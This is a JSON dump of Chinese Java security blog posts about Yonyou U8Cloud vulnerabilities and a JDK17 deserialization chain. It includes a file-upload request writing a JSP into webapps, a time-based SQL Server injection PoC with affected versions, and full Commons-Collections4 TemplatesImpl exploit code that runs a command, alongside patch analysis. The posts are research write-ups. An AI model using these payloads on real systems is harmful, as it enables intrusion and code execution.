Blog\n\n漏洞点就是readObject：\n\n但是需要着重关注一下上面的FilteredObjectInputStream：\n\n这里把HashMap作为了白名单，所以反序列化链必须以HashMap开头。\n但是这还不够，如果你直接用cc6打，会在cmd的日志里发现REJECT。\n这是因为还有黑名单过滤：\n\n黑名单通过配置文件加载：\n\n\n没打补丁前的黑名单并不多。\n能发现有fastjson1.2.83依赖和spring依赖。所以这里选择：\nHashMap.readObject–&gt;HotSwappableTargetSource.equals–&gt;XString.equals–&gt;JSONArray.toString–&gt;getter–&gt;TemplatesImpl\nfastjson利用时也需要绕一下黑名单，可以参考：\nFastJson与原生反序列化(二)\n漏洞修复\n新增resolveClass，只允许反序列化HashMap和String，而不是只检查最外层是不是HashMap\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"用友U8Cloud环境搭建","url":"/2025/08/16/%E7%94%A8%E5%8F%8BU8Cloud%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","content":"前言在配环境时踩了很多坑，尤其时调试的时候。这里把遇到的问题都记录一下，希望能给大家一点帮助。\n安装某鱼上收一个最新版本的就行，我收的是5.1的。收最新环境是为了之后挖洞，挖洞一般挑最新版本，这样挖到的洞适用性更广。以下说明均基于5.1版本。\n收到的一般是一份数据库文件和一个安装包。我数据库用的是sql server 2016  数据库怎么初始化，收到的网盘里一般都会自带，再结合网上sql server的教程，应该能够自己解决。\n这里建议把环境安装到虚拟机里，这样方便快照保存，同时以后换电脑也方便迁移。缺点是会多占用磁盘，而且还需要把各种lib从虚拟机里复制出来供远程调试使用。\n注意，安装时的端口一定要选择一个不冲突的。\n安装完成后，可以通过一个payload测试一下：\nPOST /service/esnserver HTTP/1.1Host: 127.0.0.1:8051Cache-Control: max-age=0sec-ch-ua: &quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Token: 469ce01522f64366750d1995ca119841Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brCookie: JSESSIONID=5AA7B7EB80F78BE269D5AEBE3ABE36FC.serverIf-None-Match: W/&quot;1215-1692092838000&quot;If-Modified-Since: Tue, 15 Aug 2023 09:47:18 GMTConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 239&#123;&quot;invocationInfo&quot;:&#123;&quot;ucode&quot;:&quot;123&quot;,&quot;dataSource&quot;:&quot;U8cloud&quot;,&quot;lang&quot;:&quot;en&quot;&#125;,&quot;method&quot;:&quot;uploadFile&quot;,&quot;className&quot;:&quot;nc.itf.hr.tools.IFileTrans&quot;,&quot;param&quot;:&#123;&quot;p1&quot;:&quot;shelltext&quot;,&quot;p2&quot;:&quot;webapps/u8c_web/test1234.jsp&quot;&#125;,&quot;paramType&quot;:[&quot;p1:[B&quot;,&quot;p2:java.lang.String&quot;]&#125;\n\n\n这里会在&#x2F;webapps&#x2F;u8c_web&#x2F;test1234.jsp创建一个空文件，如果能成功的话，说明环境没问题。\n远程调试这里就比较坑，我原本是在startup.bat里添加命令行参数，启动时控制台确实显示监听，且idea远程调试也能连接上。但是就是无法在断点处停下。后面问了Killer师傅才知道，原来不是在startup.bat里改，而是在”D:\\U8CERP\\ierp\\bin\\prop.xml”里修改：\n\n当然，也可以直接复制启动参数，然后在cmd里加上调试参数去手动启动：\n\n这一点真实非常坑，差点让我出师未捷身先死。\njar提取与反编译业务相关jar包位于：\n1、modules目录\n2、external目录\n3、framework目录\n另外，我这里安装的是5.1版本，有很神奇的一点，我发现业务相关的jar修改日期都是2024&#x2F;6&#x2F;23，对上面的几个目录都适用。\n大部分业务代码位于modules文件夹中，所以需要把里面的jar包全部提取出来再反编译，这样idea才能直接查找代码里的内容。\n首先使用下面的脚本，将jar包全部拷贝出来：\n@echo offsetlocal enabledelayedexpansionrem Source and destination pathsset &quot;SRC=D:\\U8CERP\\modules&quot;set &quot;DEST=D:\\U8CERP\\moduleJars&quot;rem Create destination directory if it does not existif not exist &quot;%DEST%&quot; (    mkdir &quot;%DEST%&quot;)rem Copy all .jar filesecho Copying all .class files from %SRC% to %DEST% ...for /r &quot;%SRC%&quot; %%f in (*.jar) do (    set &quot;rel=%%f&quot;    set &quot;rel=!rel:%SRC%=!&quot;    set &quot;rel=!rel:\\=_!&quot;    echo Copying: %%f    copy &quot;%%f&quot; &quot;%DEST%\\!rel!&quot; &gt;nul)rem Copy all &quot;classes&quot; folders recursivelyrem echo Copying all &quot;classes&quot; folders from %SRC% to %DEST% ...rem for /r &quot;%SRC%&quot; %%d in (classes) do (rem    if exist &quot;%%d&quot; (rem        echo Copying folder: %%drem        xcopy &quot;%%d&quot; &quot;%DEST%\\classes&quot; /e /i /y &gt;nulrem    )rem )echo All files copied successfully.pause\n\n现在有更好的方法。业务jar都是nc，u8c，com.yonyou开头的包名。可以写python脚本来筛选。然后再找到全部jar，从里面剔除之前找的业务jar，剩下的就是第三方jar了。\n复制业务jar：\nimport osimport zipfileimport shutilimport logging# 设置日志logging.basicConfig(level=logging.INFO, format=&#x27;%(asctime)s - %(message)s&#x27;)def check_jar_conditions(jar_path):    &quot;&quot;&quot;检查 JAR 文件的第一层目录中是否包含 &#x27;nc&#x27;、&#x27;u8c&#x27; 或者 com/yonyou&quot;&quot;&quot;    try:        with zipfile.ZipFile(jar_path, &#x27;r&#x27;) as jar:            file_names = jar.namelist()            first_level_dirs = set()            # 获取 JAR 文件中的第一层目录            for file in file_names:                first_level = file.split(&#x27;/&#x27;)[0]                first_level_dirs.add(first_level)            # 检查是否满足条件            if &#x27;nc&#x27; in first_level_dirs or &#x27;u8c&#x27; in first_level_dirs:                return True            if &#x27;com&#x27; in first_level_dirs:                # 如果第一层目录是 &#x27;com&#x27;，检查第二层是否为 &#x27;yonyou&#x27;                for file in file_names:                    parts = file.split(&#x27;/&#x27;)                    if len(parts) &gt;= 2 and parts[0] == &#x27;com&#x27; and parts[1] == &#x27;yonyou&#x27;:                        return True            return False    except Exception as e:        logging.error(f&quot;无法处理 JAR 文件 &#123;jar_path&#125;: &#123;e&#125;&quot;)        return Falsedef copy_jar_files(source_dir, target_dir):    &quot;&quot;&quot;递归提取目录下的所有 JAR 包，并按 dir1_dir2_xxx.jar 格式重命名&quot;&quot;&quot;    if not os.path.exists(target_dir):        os.makedirs(target_dir)    # 遍历源目录中的所有文件    for root, dirs, files in os.walk(source_dir):        for file in files:            if file.endswith(&#x27;.jar&#x27;):                jar_path = os.path.join(root, file)                # 判断该 JAR 包是否满足条件                if check_jar_conditions(jar_path):                    # 获取文件的相对路径并生成新的文件名                    relative_path = os.path.relpath(root, source_dir)                    new_filename = relative_path.replace(os.sep, &#x27;_&#x27;) + &#x27;_&#x27; + file                    target_path = os.path.join(target_dir, new_filename)                    # 检查目标目录是否已有相同文件名                    counter = 1                    while os.path.exists(target_path):                        # 如果文件已存在，给文件加上数字后缀                        name, ext = os.path.splitext(file)                        target_path = os.path.join(target_dir, f&quot;&#123;new_filename.split(&#x27;.&#x27;)[0]&#125;_&#123;counter&#125;&#123;ext&#125;&quot;)                        counter += 1                    # 复制 JAR 文件                    shutil.copy(jar_path, target_path)                    logging.info(f&quot;已复制符合条件的 JAR 文件: &#123;jar_path&#125; -&gt; &#123;target_path&#125;&quot;)if __name__ == &#x27;__main__&#x27;:    # 输入源目录和目标目录    source_directory = &#x27;./&#x27;  # 替换为源目录路径    target_directory = &#x27;D:/U8CJars/ncJars&#x27;  # 替换为目标目录路径    # 复制符合条件的 JAR 文件    copy_jar_files(source_directory, target_directory)\n\n复制第三方jar：\nimport osimport shutilimport zipfileimport loggingimport sys# 设置日志logging.basicConfig(level=logging.INFO, format=&#x27;%(asctime)s - %(message)s&#x27;)def check_first_level_for_nc_or_u8c_or_yonyou(jar_path):    &quot;&quot;&quot;检查 JAR 文件中的第一层目录是否包含 &#x27;nc&#x27; 或 &#x27;u8c&#x27; 文件夹&quot;&quot;&quot;    try:        with zipfile.ZipFile(jar_path, &#x27;r&#x27;) as jar:            file_names = jar.namelist()            first_level_dirs = set()            # 获取 JAR 文件中的第一层目录            for file in file_names:                first_level = file.split(&#x27;/&#x27;)[0]                first_level_dirs.add(first_level)            # 检查是否满足条件            if &#x27;nc&#x27; in first_level_dirs or &#x27;u8c&#x27; in first_level_dirs:                return True            if &#x27;com&#x27; in first_level_dirs:                # 如果第一层目录是 &#x27;com&#x27;，检查第二层是否为 &#x27;yonyou&#x27;                for file in file_names:                    parts = file.split(&#x27;/&#x27;)                    if len(parts) &gt;= 2 and parts[0] == &#x27;com&#x27; and parts[1] == &#x27;yonyou&#x27;:                        return True            return False    except Exception as e:        logging.error(f&quot;无法处理 JAR 文件 &#123;jar_path&#125;: &#123;e&#125;&quot;)        return Falsedef copy_jar_files(source_dir, target_dir):    &quot;&quot;&quot;递归复制所有 JAR 文件到目标目录，并按 dir1_dir2_xxx.jar 格式重命名&quot;&quot;&quot;    if not os.path.exists(target_dir):        os.makedirs(target_dir)    for root, dirs, files in os.walk(source_dir):        for file in files:            if file.endswith(&#x27;.jar&#x27;):                jar_path = os.path.join(root, file)                # 获取文件的相对路径并生成新的文件名                relative_path = os.path.relpath(root, source_dir)                new_filename = relative_path.replace(os.sep, &#x27;_&#x27;) + &#x27;_&#x27; + file                target_path = os.path.join(target_dir, new_filename)                # 如果目标目录中没有这个文件，复制它                if not os.path.exists(target_path):                    shutil.copy(jar_path, target_path)                    logging.info(f&quot;已复制新的 JAR 文件: &#123;jar_path&#125; -&gt; &#123;target_path&#125;&quot;)                else:                    logging.info(f&quot;文件已存在，跳过复制: &#123;jar_path&#125;&quot;)def delete_invalid_jars(target_dir):    &quot;&quot;&quot;遍历目标目录的 JAR 文件，删除第一层目录包含 &#x27;nc&#x27; 或 &#x27;u8c&#x27; 文件夹的文件&quot;&quot;&quot;    for root, dirs, files in os.walk(target_dir):        for file in files:            if file.endswith(&#x27;.jar&#x27;):                jar_path = os.path.join(root, file)                # 检查 JAR 文件是否需要删除                if check_first_level_for_nc_or_u8c_or_yonyou(jar_path):                    os.remove(jar_path)                    logging.info(f&quot;已删除包含 &#x27;nc&#x27; 或 &#x27;u8c&#x27; 文件夹的 JAR 文件: &#123;jar_path&#125;&quot;)if __name__ == &#x27;__main__&#x27;:    # 从命令行参数中获取输入    # if len(sys.argv) != 3:    #     print(&quot;用法: python script.py &lt;源目录&gt; &lt;目标目录&gt;&quot;)    #     sys.exit(1)    #    # source_directory = sys.argv[1]  # 源目录    # target_directory = sys.argv[2]  # 目标目录    source_directory = &quot;./&quot;    target_directory = &quot;D:/U8CJars/otherJars&quot;    # 步骤1: 复制所有 JAR 文件到目标目录，并按 dir1_dir2_xxx.jar 格式重命名    copy_jar_files(source_directory, target_directory)    # 步骤2: 删除目标目录中包含 &#x27;nc&#x27; 或 &#x27;u8c&#x27; 文件夹的 JAR 文件    delete_invalid_jars(target_directory)\n\n\n\n接着，将所有业务jar压缩成一个zip，丢进jd-gui进行反编译。旁边显示jar包说明正常，左上角file，选择save all source即可：\n\n反编译结束后，解压，添加为idea代码源即可。\n库文件添加更新一下方法，用上面的jar提取方法就行了。\n下面的是老方法，不过对于提取xml，upm等文件还是很方便的。\nu8cloud里需要添加的库文件很多，包括external，framework，lib，langlib，middleware，modules，nmc等文件夹。而且有些文件夹不是直接添加就好了，你还得一层层打开，然后添加里面的lib目录，很是麻烦。\n所以这里我让AI帮我写了脚本，把所有.jar和classes目录都复制到了一个文件夹下，这样直接添加就行了。\n@echo offsetlocal enabledelayedexpansionrem Source and destination pathsset &quot;SRC=D:\\U8CERP&quot;set &quot;DEST=D:\\U8CERP\\alllibs&quot;rem Create destination directory if it does not existif not exist &quot;%DEST%&quot; (    mkdir &quot;%DEST%&quot;)rem Copy all .jar filesecho Copying all .jar files from %SRC% to %DEST% ...for /r &quot;%SRC%&quot; %%f in (*.jar) do (    echo Copying: %%f    copy &quot;%%f&quot; &quot;%DEST%&quot; &gt;nul)rem Copy all &quot;classes&quot; folders recursivelyecho Copying all &quot;classes&quot; folders from %SRC% to %DEST% ...for /r &quot;%SRC%&quot; %%d in (classes) do (    if exist &quot;%%d&quot; (        echo Copying folder: %%d        xcopy &quot;%%d&quot; &quot;%DEST%\\classes&quot; /e /i /y &gt;nul    ))echo All files copied successfully.pause\n\n也可以直接修改后缀，这样就能复制.xml等文件到一起。\n但是这样有一个问题，就是你在idea里调试，想要查看这个jar是属于哪个文件夹时，就需要复制jar包名称，然后通过everything等工具查找，找到对应的位置。（其实可以复制的时候，将jar命名成dir1_dir2_xxx.jar形式）\n不过你也可以让AI写另一个脚本，让它把各个文件夹里的jar包写成idea中xml的格式。因为idea的库实际上是以xml的形式存储的：\n\n不过个人觉得还是第一种更方便。\n最后记得在模块-依赖里把刚刚添加的库勾选上，不然全局搜索会搜不到：\n\n部分路由映射关系webapps&#x2F;u8c_web&#x2F;web.xml 里有一部分servlet映射。\n&#x2F;u8cloud&#x2F;api&#x2F;*，&#x2F;u8cloud&#x2F;openapi&#x2F;*等都走nc.bs.framework.server.extsys.ExtSystemInvokerServlet：\n\nopenapi的映射关系在”D:\\U8CERP\\api\\config”\nu8cloud里的一部分路由，是通过InvokerServlet的方式来动态加载的。这是web.xml里决定的：\n\n\n而怎么Invoke具体的Servlet，这是由配置文件决定的”D:\\U8CERP\\modules\\uap\\META-INF”，这里面所有的.upm记录了映射关系：\n\n可以用上面的脚本把所有的upm文件复制到一起。\n也可以在这里打断点：\n\n然后访问&#x2F;service&#x2F;esnserver\n然后运行表达式：\nComponentMeta[] componentMetas = publicRepo.getComponentMetas();HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();for (int i = 0; i &lt; publicRepo.getCount(); i++) &#123;    try&#123;        String name = componentMetas[i].getName();        ComponentMeta meta = componentMetas[i];        Instantiator raw = ((ComponentMetaImpl) meta).getRawInstantiator();        Field f = raw.getClass().getDeclaredField(&quot;implementation&quot;);        f.setAccessible(true);        Class o = (Class) f.get(raw);        String clazzName = o.getName();        hashMap.put(name, clazzName);    &#125;catch (Exception e) &#123;    &#125;&#125;String filePath = &quot;D:/U8CERP/map_output.txt&quot;;try &#123;    BufferedWriter writer = new BufferedWriter(new FileWriter(filePath));    for (Map.Entry&lt;Object, Object&gt; entry : hashMap.entrySet()) &#123;        writer.write(&quot;urlName-/service/&quot;+entry.getKey() + &quot;: className-&quot; + entry.getValue());        writer.newLine(); // 换行    &#125;&#125;catch (Exception e) &#123;&#125;\n\n这样就能把url和class的映射关系全都打印出来了。\n\n部分urlName可能需要写成&#x2F;service&#x2F;uap&#x2F;xxx的形式。取决于component有没有name。像这种没有name的就需要加上uap：\n\n可以直接到我的仓库下载：\nMyJavaSecStudy&#x2F;CodeAudit&#x2F;用友U8cloud at main · 1diot9&#x2F;MyJavaSecStudy\n&#x2F;ServiceDispatcherServlet，能够调用任意service的任意public方法。service的名字从upm文件里找，是interface标签里的。\n\n补丁分析去官网能搜索到补丁：https://security.yonyou.com/#/patchList\n补丁一般是这样的目录结构：\n|   installpatch.xml|   packmetadata.xml|   readme.txt|\\---replacement    +---external    |   \\---classes    |       \\---nc    |           \\---bs    |               \\---framework    |                   \\---server    |                       \\---token    |                               TokenUtil$TokenUtilHolder.class    |                               TokenUtil.class    |    +---ierp    |   \\---bin    |       \\---token    |               trustServiceList.conf    |    \\---modules        \\---hrpub            \\---META-INF                \\---classes                    \\---nc                        \\---impl                            \\---hr                                \\---tools                                    \\---trans                                            FileTransImpl.class\n\n位于classes和META-INF中的.class文件优先级更高，这样web应用启动时就会选择最新的类，从而打上补丁。\nierp里都是配置文件，比如白名单之类的。\nhttps://www.yyu8c.com/#/u8chelp/solution/b5a47b67759a100c2a7140d00266b530\n可以通过这个工具去自动安装所有补丁\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"用友U8cloud-so.saleorder.briefing接口SQL注入","url":"/2025/08/18/%E7%94%A8%E5%8F%8BU8cloud-so-saleorder-briefing%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/","content":"影响版本3.5，3.6，3.6sp，5.0，5.0sp，5.1，5.1sp\npoc延时1.5s\nGET /u8cloud/openapi/so.saleorder.briefing?appcode=huo&amp;isEncrypt=N HTTP/1.1Host: 127.0.0.1:8051Cache-Control: max-age=0sec-ch-ua: &quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brCookie: JSESSIONID=9D2553F1DFC1E7245CDE9BABD0CD0E65.serverIf-None-Match: W/&quot;1215-1692092838000&quot;If-Modified-Since: Tue, 15 Aug 2023 09:47:18 GMTConnection: keep-aliveContent-Length: 86&#123;&quot;pk_corp&quot;:&quot;1&#x27;;WAITFOR DELAY &#x27;0:0:0.5&#x27;--&quot;,&quot;cuserid&quot;:&quot;&quot;,&quot;date_begin&quot;:&quot;&quot;,&quot;date_end&quot;:&quot;&quot;,&#125;\n\n漏洞原理朴实无华的语句拼接\n漏洞分析路由映射分析主要讲一下怎么分析出来路由的。\n首先是看了一篇文章，知道了url是：&#x2F;u8cloud&#x2F;openapi&#x2F;so.saleorder.briefing?appcode&#x3D;huo&amp;isEncrypt&#x3D;N，也知道了漏洞类：u8c.bs.so.saleorder.action.SaleOrderBriefingAction\nhttps://mp.weixin.qq.com/s/nwSs8mU_H-OBWTk2ZBxC9w\n之后去idea全局搜索u8cloud&#x2F;openapi：\n\n找到了对应的servlet：nc.bs.framework.server.extsys.ExtSystemInvokerServlet\n之后给漏洞类打上断点：\n\n然后就能慢慢分析前面的调用栈了。\n现在去找为什么so.saleorder.briefing能映射到漏洞类。看漏洞类前一个调用栈：\n\n断点处，从so.saleorder.briefing找到了对应的漏洞类，于是跟进方法u8c.bs.invoke.bp.JSONInvokeBP#queryConfigVO：\n\n再跟进u8c.bs.config.BillConfigFileParse#queryConfigVO：\n\n发现是从&#x2F;api&#x2F;config里取，用everything搜索一下：\n\n成功找到：\n\n最后用环境搭建时的bat脚本，把所有.config文件copy到一起再添加到idea库中，方便后续直接在idea中查询：\n\n请求参数分析注意到，请求中是有get参数的：?appcode&#x3D;huo&amp;isEncrypt&#x3D;N\n分析一下这两个参数的作用。\n具体逻辑在u8c.server.APIOpenController#forWard\n首先是appcode，必须和枚举类当中的一个相等：\n\n\n接下来是isEncrypt参数，具体逻辑如下：\n\n会对我们的数据进行一次解密，isEncrypt代表原数据是否加密，不加密的话就会直接返回原数据。所以需要传入N。\nSQL注入都是简单的拼接，唯一要注意的就是用SQL Server的语法注入，然后由于执行三次查询，所以延时注入的时间会变成3倍：\n\n漏洞修复用了参数化查询，做了预编译：\n\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"jdk17利用TemplatesImpl","url":"/2025/09/23/jdk17%E5%88%A9%E7%94%A8TemplatesImpl/","content":"先直接放原作者的文章：\nhttps://jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/\n文章里以及写的很清楚了，我就简单整理一下看文章时遇到的问题和学到的东西。\n1、为什么恶意类不继承AbstractTranslet\n作者说这里没有继承AbstractTranslet，因为模块检测会报错，我这里试了一下继承，结果报错：\n\n本来想着能不能在静态代码块里通过Unsafe去patchModule，试了一下发现还是不行，突然想到，这个superClass的判断，应该是比静态代码还要优先执行的，所以这个方法不奏效。\n所以，作者选择的是，添加两个bytecodes来防止空指针报错：\n\n\n将_transletIndex设置为0，防止抛出报错，且加载第一个bytecodes：\n\n\n2、Unsafe实现获取Unsafe大概是这样：\nField theUnsafe = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);theUnsafe.setAccessible(true);Unsafe unsafe = (Unsafe) theUnsafe.get(null);\n\nCC链里，invokerTransformer是通过ChainedTransformer顺序调用的。这里的特点就是，上一次transform的结果，会变成下一次transform的input。但是我们这里的Field theUnsafe要用两次，但是执行theUnsafe.setAccessible(true);返回的是void，而不是我们想要的theUnsafe。所以，我们需要找一个另外的transform方法。类似：\n\n这样就能先通过invokeTransformer执行setAccessible，并且返回的还是一个theUnsafe对象。\n作者最终选择的组合：\n\n3、isName()\n作者这里说，Module类的字段是无法通过反射获取的，这里试了一下：\n\n确实无法获取。\n4、Module全为null\n作者最后提到，把InstantiateTransformer和TrAXFilter的module全部改成null也能实现绕过。\n只要加一个ConstantTransformer，重新获取一遍Unsafe就行了。\n修改后的poc如下：\npackage com.test;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.*;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class CC4_nullModule &#123;    public static void main(String[] args) throws Exception &#123;//        Field field = Module.class.getDeclaredField(&quot;name&quot;);        // Module.name获取不到        Field field = Class.class.getDeclaredField(&quot;module&quot;);        bypassModule.getOffset(field);        // packageName偏移量为60，module偏移量为48        ClassPool pool = ClassPool.getDefault();//        pool.insertClassPath(&quot;java.io&quot;)        pool.importPackage(&quot;java.io&quot;);        CtClass ctClass = pool.makeClass(&quot;Calc&quot;);        CtConstructor staticBlock = ctClass.makeClassInitializer();        staticBlock.setBody(&quot;        try &#123;\\n&quot; +                &quot;            Runtime.getRuntime().exec(\\&quot;calc\\&quot;);\\n&quot; +                &quot;        &#125; catch (IOException e) &#123;\\n&quot; +                &quot;            throw new RuntimeException(e);\\n&quot; +                &quot;        &#125;&quot;);        ClassPool pool1 = ClassPool.getDefault();        CtClass ctClass1 = pool1.makeClass(&quot;Useless&quot;);        byte[] bytecode = ctClass.toBytecode();        byte[] bytecode1 = ctClass1.toBytecode();        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);        bypassModule.patchModule(CC4_nullModule.class, aClass);        Object templates = aClass.newInstance();        setFieldValue(templates, &quot;_name&quot;, &quot;123&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytecode, bytecode1&#125;);        setFieldValue(templates, &quot;_transletIndex&quot;, 0);        Class&lt;?&gt; TrAXFilter = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;);        InstantiateTransformer invokerTransformer9 = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);        ConstantTransformer constantTransformer2 = new ConstantTransformer(TrAXFilter);        Class UnsafeClass = Class.forName(&quot;sun.misc.Unsafe&quot;);        InvokerTransformer invokerTransformer8 = new                InvokerTransformer(&quot;getAndSetObject&quot;, new Class[]                &#123;Object.class, long.class, Object.class&#125;, new Object[]                &#123;InstantiateTransformer.class, 48, null&#125;);        InvokerTransformer invokerTransformer7 = new                InvokerTransformer(&quot;get&quot;, new Class[]&#123;Object.class&#125;, new Object[]                &#123;null&#125;);        InvokerTransformer invokerTransformer6 = new                InvokerTransformer(&quot;setAccessible&quot;, new Class[]&#123;boolean.class&#125;,                new Object[]&#123;true&#125;);        TransformerClosure transformerClosure1 = new                TransformerClosure(invokerTransformer6);        ClosureTransformer ClosureTransformer1 = new                ClosureTransformer(transformerClosure1);        InvokerTransformer invokerTransformer5 = new                InvokerTransformer(&quot;getDeclaredField&quot;, new Class[]&#123;String.class&#125;,                new Object[]&#123;&quot;theUnsafe&quot;&#125;);        ConstantTransformer constantTransformer1 = new ConstantTransformer(UnsafeClass);        InvokerTransformer invokerTransformer4 = new                InvokerTransformer(&quot;getAndSetObject&quot;, new Class[]                &#123;Object.class, long.class, Object.class&#125;, new Object[]                &#123;TrAXFilter, 48, null&#125;);        InvokerTransformer invokerTransformer3 = new                InvokerTransformer(&quot;get&quot;, new Class[]&#123;Object.class&#125;, new Object[]                &#123;null&#125;);        InvokerTransformer invokerTransformer2 = new                InvokerTransformer(&quot;setAccessible&quot;, new Class[]&#123;boolean.class&#125;,                new Object[]&#123;true&#125;);        TransformerClosure transformerClosure = new                TransformerClosure(invokerTransformer2);        ClosureTransformer ClosureTransformer = new                ClosureTransformer(transformerClosure);        InvokerTransformer invokerTransformer = new                InvokerTransformer(&quot;getDeclaredField&quot;, new Class[]&#123;String.class&#125;,                new Object[]&#123;&quot;theUnsafe&quot;&#125;);        ConstantTransformer constantTransformer = new                ConstantTransformer(UnsafeClass);        Transformer[] transformers=new Transformer[]                &#123;constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3, invokerTransformer4,                        constantTransformer1, invokerTransformer5, ClosureTransformer1, invokerTransformer7, invokerTransformer8, constantTransformer2, invokerTransformer9&#125;;        Transformer keyTransformer = new                ChainedTransformer(transformers);        System.out.println(TrAXFilter.getModule());        System.out.println(InvokerTransformer.class.getModule());        TransformingComparator transformingComparator = new TransformingComparator(keyTransformer);        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);        bypassModule.patchModule(CC4_nullModule.class, PriorityQueue.class);        Field size = priorityQueue.getClass().getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.setInt(priorityQueue, 2);//        ByteArrayOutputStream baos = new ByteArrayOutputStream();        FileOutputStream fos = new FileOutputStream(&quot;cc4.bin&quot;);        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(priorityQueue);        oos.close();        FileInputStream fis = new FileInputStream(&quot;cc4.bin&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        ois.readObject();        ois.close();    &#125;    public static void setFieldValue (Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    &#125;&#125;\n\nbypassModule:\npackage com.test;import sun.misc.Unsafe;import java.lang.reflect.Field;import java.lang.reflect.Method;public class bypassModule &#123;    public static void patchModule(Class current, Class target) throws Exception &#123;        Unsafe unsafe = getUnsafe();        long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;));//        Method method = Class.class.getDeclaredMethod(&quot;getModule&quot;);//        method.setAccessible(true);//        Object targetModule = method.invoke(target);        Module targetModule = target.getModule();        unsafe.putObject(current, offset, targetModule);    &#125;    public static void patch(Class clazz) throws Exception &#123;        Unsafe unsafe = getUnsafe();        long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;));        unsafe.putObject(clazz, offset, Object.class.getModule());    &#125;    public static Unsafe getUnsafe() throws Exception&#123;        Field theUnsafe = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);        theUnsafe.setAccessible(true);        Unsafe unsafe = (Unsafe) theUnsafe.get(null);        return unsafe;    &#125;    public static void getOffset(Field f) throws Exception &#123;        Unsafe unsafe = getUnsafe();        long offset = unsafe.objectFieldOffset(f);        System.out.println(offset);    &#125;&#125;\n\n\n\n5、虚拟机参数选项在生成序列化数据时，我们会用到：\nClass&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);bypassModule.patchModule(MyExp.class, aClass);Object templates = aClass.newInstance();\n\n来生成templatesImpl对象。\n除了直接使用patchModule方法，我们还可以在虚拟机选项中添加参数：\n\n--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\n\n这样也能实现patchModule的效果。\n结语看懂大佬的文章并不难，但是像大佬一样，在不知道能否成功的情况下，独立挖掘链子，想办法去寻找新的绕过，我感觉很困难。总之还有很多要学习的，慢慢来吧，坚持不懈最重要。\n另外，再补充几个链接，因为这个文章发在好几个社区了：\nhttps://xz.aliyun.com/news/18628\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"jdk17模块化特性&绕过","url":"/2025/09/23/jdk17%E6%A8%A1%E5%9D%97%E5%8C%96%E7%89%B9%E6%80%A7-%E7%BB%95%E8%BF%87/","content":"模块化介绍这是jdk8的库：\n\n这是jdk17的库：\n\n从jdk9开始，就引入了模块化机制，旨在提高 Java 